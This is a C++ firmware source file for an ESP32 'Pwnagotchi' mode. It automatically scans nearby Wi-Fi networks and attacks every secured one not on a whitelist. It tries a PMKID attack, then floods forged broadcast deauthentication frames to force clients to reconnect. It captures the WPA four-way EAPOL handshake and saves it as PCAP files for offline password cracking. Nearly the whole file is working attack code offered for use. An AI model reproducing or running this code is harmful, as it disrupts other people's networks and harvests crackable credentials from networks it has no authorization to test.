#include <vector>
#include <map>
#include "WiFi.h"
#include "esp_wifi.h"
#include "settings.h"
#include "mood.h"
#include "newPwnagotchi.h"

//important stuff
std::vector<wifiRTResults> g_wifiRTResults;
wifiRTResults ap; //network being currently attacked
SemaphoreHandle_t wifiResultsMutex = nullptr; // Thread-safe access to g_wifiRTResults
const int networkTimeout = 10000; // Time in ms to consider a network "expired" if not seen again

//for eapol sniffer
struct CapturedPacket{
  size_t    len;
  uint8_t  *data;
  uint32_t  ts_sec;
  uint32_t  ts_usec;
};

// File write request for main task to handle SD I/O
struct FileWriteRequest {
  char filename[64];
  uint8_t* beaconFrame;
  uint16_t beaconFrameLen;
  uint32_t beaconTs_sec;
  uint32_t beaconTs_usec;
  std::vector<CapturedPacket*> packets;  // packets to write
  String ssid;  // for logging
  uint8_t bssid[6];  // for logging
};

bool beaconDetected = false;
const uint8_t* beaconFrame = nullptr;
uint16_t beaconFrameLen = 0;
bool targetAPSet = false;
uint8_t targetBSSID[6];
uint8_t eapolCount = 0; // count EAPOL frames in sequence
bool eapolMsg[5] = {false}; // Track if we've seen messages 1,2,3,4 (indices 1-4)
QueueHandle_t packetQueue = nullptr;
QueueHandle_t fileWriteQueue = nullptr;  // Queue for file write requests from pwnagotchi task
TaskHandle_t pwnagotchiTaskHandle = nullptr;
bool pwnagotchiRunning = false;
//end of eapol sniffer globals
//savers
struct pcap_hdr_s {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
} __attribute__((packed));

struct pcaprec_hdr_s {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
} __attribute__((packed));
File file;

// Track successfully captured APs (use String instead of const char* to avoid dangling pointers)
std::vector<String> pwnedAPs;
std::vector<String> failedClients;
//end of savers

//helper
// Helper function to check if a network still exists in the scan results
bool networkStillExists(const String& ssid, int channel) {
    if (wifiResultsMutex == nullptr) return false;
    if (xSemaphoreTake(wifiResultsMutex, 0) != pdTRUE) return false;
    
    bool found = false;
    for (const auto& entry : g_wifiRTResults) {
        if (entry.ssid == ssid && entry.channel == channel) {
            if (millis() - entry.lastSeen <= networkTimeout) { // Check if seen within last 5 seconds
                found = true;
            }
            break;
        }
    }
    xSemaphoreGive(wifiResultsMutex);
    return found;
}

// Check if handshake is complete (received all 4 EAPOL messages in order)
bool isHandshakeComplete() {
    // For a complete handshake, we need to have seen messages 1, 2, 3, and 4
    return (eapolMsg[1] && eapolMsg[2] && eapolMsg[3] && eapolMsg[4]);
}

static inline int ieee80211_hdrlen(uint16_t fc)
{
    int hdrlen = 24;

    uint8_t type = (fc >> 2) & 0x3;
    uint8_t subtype = (fc >> 4) & 0xF;

    if (type == 2) { // data
        // ToDS + FromDS = 4 address frame
        if ((fc & 0x0300) == 0x0300) {
            hdrlen += 6;
        }

        // QoS
        if (subtype & 0x08) {
            hdrlen += 2;
        }
    }

    // Order bit → HT control present
    if (fc & 0x8000) {
        hdrlen += 4;
    }

    return hdrlen;
}

// Name: getEAPOLOrder
// Description: Parses an EAPOL frame to determine if it's message 1, 2, 3, or 4 of the WPA handshake based on the Key Info field in the EAPOL Key Descriptor. Returns 0 if it's not a valid EAPOL key frame, or 1-4 for the respective message types.
uint8_t getEAPOLOrder(uint8_t *buf, size_t buf_len) {
    if (buf == nullptr || buf_len < 32) return 0;
    
    // Parse the frame control to get header length
    uint16_t fc = buf[0] | (buf[1] << 8);
    int hdrlen = ieee80211_hdrlen(fc);
    
    // Validate header length
    if (hdrlen < 24 || hdrlen > 36) return 0;
    
    // Check if we have enough data for LLC+SNAP+EAPOL header
    // Need: hdrlen (MAC header) + 8 (LLC/SNAP) + 5 (EAPOL header) + 5 (Key frame) minimum
    if (hdrlen + 18 > buf_len) return 0;
    
    // Get LLC/SNAP header
    const uint8_t *llc = buf + hdrlen;
    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
          llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
          llc[6] == 0x88 && llc[7] == 0x8E)) {
        return 0; // Not EAPOL
    }
    
    // EAPOL header starts after LLC/SNAP
    const uint8_t *eapol = llc + 8;
    // EAPOL: version(1) + type(1) + length(2) + key_descriptor_version(1)
    // Key info is at offset 1-2 after key_descriptor_version
    if (eapol[1] != 3) return 0; // Not a key frame (type 3)
    
    // Validate we have enough data for key info
    if (hdrlen + 8 + 5 + 2 > buf_len) return 0;
    
    // Key info field is at eapol[5] and eapol[6] (big-endian)
    uint16_t key_info = (eapol[5] << 8) | eapol[6];
    
    bool mic     = key_info & (1 << 8);
    bool ack     = key_info & (1 << 7);
    bool install = key_info & (1 << 6);
    bool secure  = key_info & (1 << 9);

    if (!mic && ack && !install && !secure) {
        logMessage("EAPOL Message 1 detected");
        return 1; // Message 1
    }
    if (mic && !ack && !install && !secure) {
        logMessage("EAPOL Message 2 detected");
        return 2; // Message 2
    }
    if (mic && ack && install && secure) {
        logMessage("EAPOL Message 3 detected");
        return 3;
    }
    if (mic && !ack && !install && secure) {
        logMessage("EAPOL Message 4 detected");
        return 4; // Message 4
    }

    fLogMessage("Unknown EAPOL message type, key_info=0x%04X", key_info);
    return 0; // Unknown
}

void wifiRTScanCallback(void* buf, wifi_promiscuous_pkt_type_t type){
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    if (pkt == nullptr) return;
    uint16_t len = pkt->rx_ctrl.sig_len;
    const uint8_t *payload = pkt->payload;
    int8_t rssi = pkt->rx_ctrl.rssi;
    uint8_t bssid[6];
    memcpy(bssid, pkt->payload + 10, 6);
    uint8_t channel = pkt->rx_ctrl.channel;
    
    if(type == WIFI_PKT_MGMT){
        // read channel from DS Parameter Set (tag 3) in the tagged parameters (fallback to radio channel)
        uint8_t ap_channel = channel;
        if (pkt->rx_ctrl.sig_len > 36) {
            int pos_ch = 36; // start of tagged parameters
            while (pos_ch + 2 <= pkt->rx_ctrl.sig_len - 1) {
                uint8_t tag = pkt->payload[pos_ch];
                uint8_t len_tag = pkt->payload[pos_ch + 1];
                if (pos_ch + 2 + len_tag > pkt->rx_ctrl.sig_len) break; // bounds check
                if (tag == 3 && len_tag == 1) { // DS Parameter Set - current channel
                    ap_channel = pkt->payload[pos_ch + 2];
                    break;
                }
                pos_ch += 2 + len_tag;
            }
        }
        channel = ap_channel;

        // capability info is at offsets 34..35 (fixed fields end at 36). privacy bit (0x0010) indicates security.
        uint16_t cap = (uint16_t)pkt->payload[34] | ((uint16_t)pkt->payload[35] << 8);
        bool secure = (cap & 0x0010) != 0;
        
        // Extract SSID from tagged parameters
        String ssid = "";
        int pos = 36; // start of tagged parameters
        while (pos + 2 < pkt->rx_ctrl.sig_len) {
            uint8_t tag = pkt->payload[pos];
            uint8_t len_tag = pkt->payload[pos + 1];
            
            // Bounds check
            if (pos + 2 + len_tag > pkt->rx_ctrl.sig_len) break;
            
            if (tag == 0 && len_tag <= 32) { // SSID tag
                ssid = String((char*)(pkt->payload + pos + 2), len_tag);
                break;
            }
            pos += 2 + len_tag;
        }
        
        // Skip networks with empty SSID
        if (ssid.length() == 0) return;
        
        wifiRTResults newResult = {ssid, rssi, channel, secure, {bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]}, millis()};
        
        // Thread-safe access to g_wifiRTResults
        if (wifiResultsMutex) {
            if (xSemaphoreTake(wifiResultsMutex, 0) == pdTRUE) {
                // Check for duplicates, then add if new to vector list
                bool ifDuplicate = false;
                for(auto &entry : g_wifiRTResults){
                    if(entry.ssid == ssid && entry.channel == channel){
                        entry.rssi = rssi; // update RSSI if same SSID/channel seen again
                        entry.lastSeen = millis(); // update last seen timestamp
                        ifDuplicate = true;
                        break;
                    }
                }
                if(!ifDuplicate){
                    g_wifiRTResults.push_back(newResult);
                }
                
                //check if any network expired (not seen for 5 seconds) and remove them from the list
                g_wifiRTResults.erase(std::remove_if(g_wifiRTResults.begin(), g_wifiRTResults.end(), [](const wifiRTResults& entry) {
                    return millis() - entry.lastSeen > 5000; // 5 second timeout
                }), g_wifiRTResults.end());
                
                xSemaphoreGive(wifiResultsMutex);
            }
        }
    
        if (len < 24) return; // too short for frame control + MAC header

        // ---- Parse frame control ----
        uint16_t fc = payload[0] | (payload[1] << 8);
        uint8_t ftype    = (fc >> 2) & 0x3;   // 0=mgmt,1=ctrl,2=data
        uint8_t fsubtype = (fc >> 4) & 0xF;

        // ---- Detect beacon ----
        if (ftype == 0 && fsubtype == 8 && !beaconDetected) { // mgmt + beacon
            if (targetAPSet) {
                const uint8_t *pkt_bssid = &payload[16];
                if (memcmp(pkt_bssid, targetBSSID, 6) != 0) {
                    return; // not the targeted AP
                }
            }
            if (!beaconDetected) {
                beaconDetected = true;
                // Real beacon length = len - 4 (ESP32 adds ghost 4 bytes)
                uint16_t beaconLen = (len > 4) ? len - 4 : len;

                beaconFrame = (uint8_t *) malloc(beaconLen);
                if (!beaconFrame) {
                    beaconDetected = false;
                    return;
                }
                memcpy((void*)beaconFrame, payload, beaconLen);
                beaconFrameLen = beaconLen; // save corrected length
                logMessage("Beacon frame captured and stored.");
            }
            return; // skip further processing
        }
    }
    else if (type == WIFI_PKT_DATA) {
        if(ap.ssid.length() == 0) return; // not targeting any AP yet
        if (!beaconDetected || beaconFrame == nullptr) return;

        uint16_t fc = payload[0] | (payload[1] << 8);
        int hdrlen = ieee80211_hdrlen(fc);
        if (len < hdrlen + 8) return;

        const uint8_t *llc = payload + hdrlen;
        if (!(llc[0]==0xAA && llc[1]==0xAA && llc[2]==0x03 &&
            llc[6]==0x88 && llc[7]==0x8E)) return;

        // Correct BSSID extraction based on ToDS/FromDS
        bool toDS   = (fc >> 8) & 0x01;
        bool fromDS = (fc >> 8) & 0x02;
        const uint8_t *pktBSSID;
        if (toDS && !fromDS)      pktBSSID = &payload[4];
        else if (!toDS && fromDS) pktBSSID = &payload[10];
        else                      pktBSSID = &payload[16];

        if (memcmp(pktBSSID, targetBSSID, 6) != 0) return;

        // Fix: actually set eapolMsg flags
        uint8_t msgNum = getEAPOLOrder((uint8_t*)payload, len);
        if (msgNum >= 1 && msgNum <= 4) {
            eapolMsg[msgNum] = true;
        }

        if (len == 0 || len > MAX_PKT_SIZE) return;
        if (len == 0 || len > MAX_PKT_SIZE) return;

        CapturedPacket *p = (CapturedPacket*) malloc(sizeof(CapturedPacket));
        if (!p) return;
        p->data = (uint8_t *) malloc(len);
        if (!p->data) {
            free(p);
            return;
        }

        memcpy(p->data, payload, len);
        p->len = len;

        uint64_t ts = esp_timer_get_time();
        p->ts_sec = ts / 1000000;
        p->ts_usec = ts % 1000000;

        BaseType_t xHigherPriorityTaskWoken = pdFALSE;
        // MEMORY LEAK FIX: Check if send was successful
        if (xQueueSendFromISR(packetQueue, &p, &xHigherPriorityTaskWoken) != pdTRUE) {
            // Queue full, free memory immediately to prevent leak
            free(p->data);
            free(p);
        } else {
            if (xHigherPriorityTaskWoken) {
                portYIELD_FROM_ISR();
            }
        }
    }
}

bool n_pwnagotchi::begin() {
    logMessage("Initializing Pwnagotchi mode...");
    
    // Create mutex for thread-safe access to results
    if (wifiResultsMutex == nullptr) {
        wifiResultsMutex = xSemaphoreCreateMutex();
        if (wifiResultsMutex == nullptr) {
            logMessage("Failed to create wifiResultsMutex!");
            return false;
        }
    }
    
    // Create packet queue for EAPOL sniffer
    if (packetQueue == nullptr) {
        packetQueue = xQueueCreate(10, sizeof(CapturedPacket*));
        if (packetQueue == NULL) {
            logMessage("Failed to create packet queue!");
            return false;
        }
    }
    
    // Create file write queue for main task
    if (fileWriteQueue == nullptr) {
        fileWriteQueue = xQueueCreate(5, sizeof(FileWriteRequest*));
        if (fileWriteQueue == NULL) {
            logMessage("Failed to create file write queue!");
            return false;
        }
    }
    
    // Initialize WiFi in promiscuous mode with our callback
    esp_wifi_set_promiscuous_rx_cb(&wifiRTScanCallback);
    esp_wifi_set_promiscuous(true);
    logMessage("Pwnagotchi mode initialized.");
    
    // Create the task that will handle the attacks
    pwnagotchiRunning = true;
    BaseType_t result = xTaskCreatePinnedToCore(task, "PwnagotchiTask", 8192*6, NULL, 1, &pwnagotchiTaskHandle, 1);
    if (result != pdPASS) {
        logMessage("Failed to create Pwnagotchi task!");
        pwnagotchiRunning = false;
        esp_wifi_set_promiscuous(false);
        return false;
    }
    
    logMessage("Pwnagotchi task created successfully.");
    return true;
}

bool n_pwnagotchi::end() {
    logMessage("Stopping Pwnagotchi mode...");
    
    // Signal the task to stop
    pwnagotchiRunning = false;
    
    // Wait for task to finish (give it 2 seconds max)
    if (pwnagotchiTaskHandle != nullptr) {
        vTaskDelete(pwnagotchiTaskHandle);
        pwnagotchiTaskHandle = nullptr;
        logMessage("Pwnagotchi task deleted.");
    }
    
    // Stop promiscuous mode
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    logMessage("WiFi promiscuous mode disabled.");
    
    // Clean up packet queue
    if (packetQueue != nullptr) {
        CapturedPacket *packet = NULL;
        // Drain any remaining packets in queue
        while (xQueueReceive(packetQueue, &packet, 0) == pdTRUE) {
            if (packet) {
                if (packet->data) free(packet->data);
                free(packet);
            }
        }
        vQueueDelete(packetQueue);
        packetQueue = NULL;
        logMessage("Packet queue cleaned up.");
    }
    // Clean up file write queue
    if (fileWriteQueue != nullptr) {
        FileWriteRequest *req = NULL;
        // Drain any remaining file write requests
        while (xQueueReceive(fileWriteQueue, &req, 0) == pdTRUE) {
            if (req) {
                // Free beacon frame if present
                if (req->beaconFrame) {
                    free(req->beaconFrame);
                }
                // Free all packets
                for (auto* pkt : req->packets) {
                    if (pkt && pkt->data) free(pkt->data);
                    if (pkt) free(pkt);
                }
                req->packets.clear();
                delete req;
            }
        }
        vQueueDelete(fileWriteQueue);
        fileWriteQueue = NULL;
        logMessage("File write queue cleaned up.");
    }    
    // Free beacon frame if still allocated
    if (beaconFrame != nullptr) {
        free((void*)beaconFrame);
        beaconFrame = nullptr;
    }
    
    // Reset state variables
    beaconDetected = false;
    eapolCount = 0;
    targetAPSet = false;
    
    // Close any open files
    if (file) {
        file.close();
    }
    
    // Clear the results vectors (optional, can be kept for persistence)
    if (wifiResultsMutex && xSemaphoreTake(wifiResultsMutex, portMAX_DELAY) == pdTRUE) {
        g_wifiRTResults.clear();
        xSemaphoreGive(wifiResultsMutex);
    }
    
    // Cleanup mutex
    if (wifiResultsMutex != nullptr) {
        vSemaphoreDelete(wifiResultsMutex);
        wifiResultsMutex = nullptr;
    }
    
    logMessage("Pwnagotchi mode stopped.");
    return true;
}

#include "PMKIDGrabber.h"

// Function to handle file writes - called from main task
void handleFileWrite(FileWriteRequest* req) {
    if (!req) return;
    
    logMessage("[FileWriter] Starting write for AP: " + req->ssid);
    
    // Create handshake directory if it doesn't exist
    if (!FSYS.exists("/handshake")) {
        logMessage("[FileWriter] Creating /handshake directory...");
        FSYS.mkdir("/handshake");
        vTaskDelay(100 / portTICK_PERIOD_MS);  // Give SD a moment
    }
    
    // Open file
    File file = FSYS.open(req->filename, FILE_WRITE, true);
    if (!file) {
        logMessage("[FileWriter] ERROR: Failed to open PCAP file: " + String(req->filename));
        // Clean up request
        if (req->beaconFrame) free(req->beaconFrame);
        for (auto* pkt : req->packets) {
            if (pkt && pkt->data) free(pkt->data);
            if (pkt) free(pkt);
        }
        req->packets.clear();
        delete req;
        return;
    }
    
    logMessage("[FileWriter] PCAP file opened: " + String(req->filename));
    
    // Write global PCAP header
    pcap_hdr_s globalHeader;
    globalHeader.magic_number  = 0xa1b2c3d4;
    globalHeader.version_major = 2;
    globalHeader.version_minor = 4;
    globalHeader.thiszone      = 0;
    globalHeader.sigfigs       = 0;
    globalHeader.snaplen       = 65535;
    globalHeader.network       = 105; // LINKTYPE_IEEE802_11
    file.write((uint8_t*)&globalHeader, sizeof(globalHeader));
    file.flush();
    
    logMessage("[FileWriter] PCAP header written");
    
    // Write beacon frame if present
    if (req->beaconFrame != nullptr && req->beaconFrameLen > 0) {
        pcaprec_hdr_s beaconHeader;
        beaconHeader.ts_sec  = req->beaconTs_sec;
        beaconHeader.ts_usec = req->beaconTs_usec;
        beaconHeader.incl_len = req->beaconFrameLen;
        beaconHeader.orig_len = req->beaconFrameLen;
        file.write((uint8_t*)&beaconHeader, sizeof(beaconHeader));
        file.write(req->beaconFrame, req->beaconFrameLen);
        file.flush();
        logMessage("[FileWriter] Beacon frame written");
    }
    
    // Write all captured packets
    for (size_t i = 0; i < req->packets.size(); i++) {
        CapturedPacket* pkt = req->packets[i];
        if (pkt != nullptr && pkt->data != nullptr) {
            pcaprec_hdr_s recHeader;
            recHeader.ts_sec   = pkt->ts_sec;
            recHeader.ts_usec  = pkt->ts_usec;
            recHeader.incl_len = pkt->len;
            recHeader.orig_len = pkt->len;
            file.write((uint8_t*)&recHeader, sizeof(recHeader));
            file.write(pkt->data, pkt->len);
            file.flush();
        }
    }
    
    logMessage("[FileWriter] All " + String(req->packets.size()) + " packets written");
    
    // Close file
    if (file) {
        file.close();
        logMessage("[FileWriter] PCAP file closed: " + String(req->filename));
    }
    
    // Clean up request
    if (req->beaconFrame) free(req->beaconFrame);
    for (auto* pkt : req->packets) {
        if (pkt && pkt->data) free(pkt->data);
        if (pkt) free(pkt);
    }
    req->packets.clear();
    delete req;
}

#include "pwnagothi.h"

void task(void* parameter){
    auto whitelist = parseWhitelist();
    while (pwnagotchiRunning) {
        // Safely access the WiFi results
        if (wifiResultsMutex && xSemaphoreTake(wifiResultsMutex, portMAX_DELAY) == pdTRUE) {
            std::vector<wifiRTResults> localResults = g_wifiRTResults; // Copy for iteration
            xSemaphoreGive(wifiResultsMutex);
            
            // Iterate through all discovered APs
            for (auto& network : localResults) {
                if (!pwnagotchiRunning) break; // Check for shutdown signal

                //check for whitelist and skip if ssid matches
                if(std::find(whitelist.begin(), whitelist.end(), network.ssid) != whitelist.end()){
                    logMessage("Skipping " + network.ssid + " - SSID is whitelisted.");
                    continue;
                }
                
                ap = network;
                
                // Verify network still exists before attacking it
                if (!networkStillExists(network.ssid, network.channel)) {
                    logMessage("Skipping " + network.ssid + " - no longer in scan results.");
                    continue;
                }
                
                // Run attack task (will exit early if network disappears)
                unsigned long attackStartTime = millis();
                attackTask(nullptr);
                
                unsigned long attackDuration = millis() - attackStartTime;
                logMessage("Attack on " + network.ssid + " completed in " + String(attackDuration) + "ms");
                ap = {"", 0, 0, false}; // reset target AP after attack
            }
            //switch chanel after each full scan iteration to try to trigger new beacons and keep results fresh
            if (wifiMutex) {
                xSemaphoreTake(wifiMutex, portMAX_DELAY);
                uint8_t c_channel;
                esp_wifi_get_channel(&c_channel, nullptr);
                c_channel = (c_channel % 13) + 1; // cycle through channels
                esp_wifi_set_channel(c_channel, WIFI_SECOND_CHAN_NONE);
                xSemaphoreGive(wifiMutex);
                logMessage("Switched to channel " + String(c_channel) + " for next scan iteration.");
            }
        }
        
        vTaskDelay(100 / portTICK_PERIOD_MS); // 100ms between scan iterations
    }
    
    // Cleanup before task exit
    vTaskDelete(NULL);
}

void attackTask(void* parameter){
    if(!ap.secure){
        return; // skip open networks
    }
    
    // Check if already pwned (using String comparison)
    for (const auto& pwned : pwnedAPs) {
        if (pwned == ap.ssid) {
            return; // already pwned
        }
    }

    //check if network was previously attempted and failed to capture clients (using String comparison)
    for (const auto& failed : failedClients) {
        if (failed == ap.ssid) {
            logMessage("Skipping " + ap.ssid + " - previously attempted with no client captures.");
            return; // previously attempted with no client captures
        }
    }
    
    // Verify network still exists before attempting attack
    if (!networkStillExists(ap.ssid, ap.channel)) {
        logMessage("Network " + ap.ssid + " disappeared before attack started.");
        return;
    }
    
    logMessage("Attempting to pwn AP: " + ap.ssid);
    
    //PHASE 1: Association (PMKID attack)
    logMessage("Starting PMKID attack on AP: " + ap.ssid);
    if(runPMKIDAttack(ap.bssid, ap.channel)){
        logMessage("Successfully pwned AP: " + ap.ssid);
        // Add to pwned list if not already there
        if (std::find(pwnedAPs.begin(), pwnedAPs.end(), ap.ssid) == pwnedAPs.end()) {
            pwnedAPs.push_back(ap.ssid);
        }
        pwned_ap++;
        sessionCaptures++;
        saveSettings();
        if(pwnagotchi.sound_on_events){
            delay(100);
            M5.Speaker.tone(1500, 100);
            delay(100);
            M5.Speaker.tone(2000, 100);
            delay(100);
            M5.Speaker.tone(2500, 150);
            delay(150);
        }
        return; // skip to next AP after successful attack
    } else {
        logMessage("Failed to pwn AP via PMKID: " + ap.ssid);
    }
    logMessage("PMKID attack completed on AP: " + ap.ssid);

    //PHASE 2: EAPOL handshake capture (if PMKID attack fails)
    //reinit procmiscuous mode to reset state and ensure we capture beacons for this AP
    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    esp_wifi_set_promiscuous(false);
    vTaskDelay(100 / portTICK_PERIOD_MS); // short delay to ensure state reset
    esp_wifi_set_promiscuous_rx_cb(&wifiRTScanCallback);
    esp_wifi_set_promiscuous(true);
    xSemaphoreGive(wifiMutex);
    
    // Verify network still exists before EAPOL phase
    if (!networkStillExists(ap.ssid, ap.channel)) {
        logMessage("Network " + ap.ssid + " disappeared before EAPOL phase.");
        return;
    }
    
    logMessage("Attempting EAPOL handshake capture on AP: " + ap.ssid);
    targetAPSet = true;
    memcpy(targetBSSID, ap.bssid, 6);
    
    // Reset EAPOL message tracking for this attack
    for (int i = 0; i < 5; i++) eapolMsg[i] = false;
    
    //DEAUTH TIME!:
    uint8_t target_mac[6] = {ap.bssid[0], ap.bssid[1], ap.bssid[2], ap.bssid[3], ap.bssid[4], ap.bssid[5]};
    uint8_t deauth_packet[26] = {
        0xC0, 0x00,
        0x3A, 0x01,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
        target_mac[0],target_mac[1],target_mac[2],
        target_mac[3],target_mac[4],target_mac[5],
        target_mac[0],target_mac[1],target_mac[2],
        target_mac[3],target_mac[4],target_mac[5],
        0x00,0x00,
        0x01,0x00
    };

    // Send deauth packets in bursts, checking for network existence
    uint16_t deauthCount = 0;
    for (uint16_t i = 0; i < 120; i++) {
        // Check every 30 packets if network still exists to exit early
        if ((i % 30) == 0 && i > 0) {
            if (!networkStillExists(ap.ssid, ap.channel)) {
                logMessage("Network " + ap.ssid + " disappeared during deauth. Sent " + String(deauthCount) + " packets.");
                targetAPSet = false;
                return;
            }
        }
        
        if (wifiMutex) {
            xSemaphoreTake(wifiMutex, portMAX_DELAY);
        }
        esp_err_t res = esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        if (wifiMutex) {
            xSemaphoreGive(wifiMutex);
        }
        if (res == ESP_OK) deauthCount++;
    }
    logMessage("Deauth packets sent to AP: " + ap.ssid + " (" + String(deauthCount) + " successful)");
    
    // Wait for EAPOL capture with network existence checks
    unsigned long startTime = millis();
    const unsigned long EAPOL_TIMEOUT = 15000; // 15 second timeout
    
    while(!isHandshakeComplete() && millis() - startTime < EAPOL_TIMEOUT) {
        // Check every second if network still exists
        if ((millis() - startTime) % 1000 < 100) {
            if (!networkStillExists(ap.ssid, ap.channel)) {
                logMessage("Network " + ap.ssid + " disappeared during EAPOL capture after " + String(millis() - startTime) + "ms.");
                targetAPSet = false;
                return;
            }
        }
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        delay(70); // Reduced from 1000ms to check more frequently and detect completion sooner
    }
    
    if(isHandshakeComplete()){
        logMessage("Successfully captured EAPOL handshake for AP: " + ap.ssid + " in " + String(millis() - startTime) + "ms");
        // Add to pwned list if not already there
        if (std::find(pwnedAPs.begin(), pwnedAPs.end(), ap.ssid) == pwnedAPs.end()) {
            pwnedAPs.push_back(ap.ssid);
        }
        
        logMessage("Complete handshake sequence captured. Queuing for file write.");
        vTaskDelay(1000 / portTICK_PERIOD_MS);

        eapolCount = 0; // reset for next sequence
        for (int i = 0; i < 5; i++) eapolMsg[i] = false; // reset message tracking

        // Create file write request
        FileWriteRequest* req = new FileWriteRequest();
        if (!req) {
            logMessage("ERROR: Failed to allocate FileWriteRequest!");
            targetAPSet = false;
            return;
        }
        
        // Prepare filename
        char bssidStr[18];
        const uint8_t* bssid = ap.bssid;
        snprintf(bssidStr, sizeof(bssidStr), "%02X_%02X_%02X_%02X_%02X_%02X",
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        snprintf(req->filename, sizeof(req->filename), "/handshake/%s_%s_ID_%i.pcap",
                bssidStr, ap.ssid.c_str(), random(999));
        
        req->ssid = ap.ssid;
        memcpy(req->bssid, ap.bssid, 6);
        
        // Copy beacon frame data to request
        if (beaconDetected && beaconFrame != nullptr && beaconFrameLen > 0) {
            req->beaconFrame = (uint8_t*) malloc(beaconFrameLen);
            if (req->beaconFrame) {
                memcpy(req->beaconFrame, beaconFrame, beaconFrameLen);
                req->beaconFrameLen = beaconFrameLen;
                
                uint64_t ts = esp_timer_get_time();
                req->beaconTs_sec = ts / 1000000;
                req->beaconTs_usec = ts % 1000000;
                logMessage("Beacon frame queued for write (" + String(beaconFrameLen) + " bytes)");
            }
        }
        
        // Collect all packets from the queue
        CapturedPacket *packet = NULL;
        while(xQueueReceive(packetQueue, &packet, 10 / portTICK_PERIOD_MS) == pdTRUE) {
            if (packet != nullptr) {
                req->packets.push_back(packet);
            }
        }
        
        logMessage("Queued " + String(req->packets.size()) + " packets for file write");
        
        // Queue the file write request for the main task to handle
        if (fileWriteQueue && xQueueSend(fileWriteQueue, &req, portMAX_DELAY) != pdTRUE) {
            logMessage("ERROR: Failed to queue file write request!");
            // Clean up on failure
            if (req->beaconFrame) free(req->beaconFrame);
            for (auto* pkt : req->packets) {
                if (pkt && pkt->data) free(pkt->data);
                if (pkt) free(pkt);
            }
            req->packets.clear();
            delete req;
            targetAPSet = false;
            return;
        }
        pwned_ap++;
        sessionCaptures++;
        if(pwnagotchi.sound_on_events){
            delay(100);
            M5.Speaker.tone(1500, 100);
            delay(100);
            M5.Speaker.tone(2000, 100);
            delay(100);
            M5.Speaker.tone(2500, 150);
            delay(150);
        }
        saveSettings(); 
        logMessage("File write request successfully queued");
    } else {
        logMessage("Failed to capture EAPOL handshake for AP: " + ap.ssid + " (timeout or network disappeared)");
        if (std::find(failedClients.begin(), failedClients.end(), ap.ssid) == failedClients.end()) {
            failedClients.push_back(ap.ssid);
        }
    }
    
    // Reset beacon and EAPOL state for next AP
    beaconDetected = false;
    eapolCount = 0;
    targetAPSet = false;

    if (beaconFrame) {
        free((void*)beaconFrame);
        beaconFrame = nullptr;
    }
}
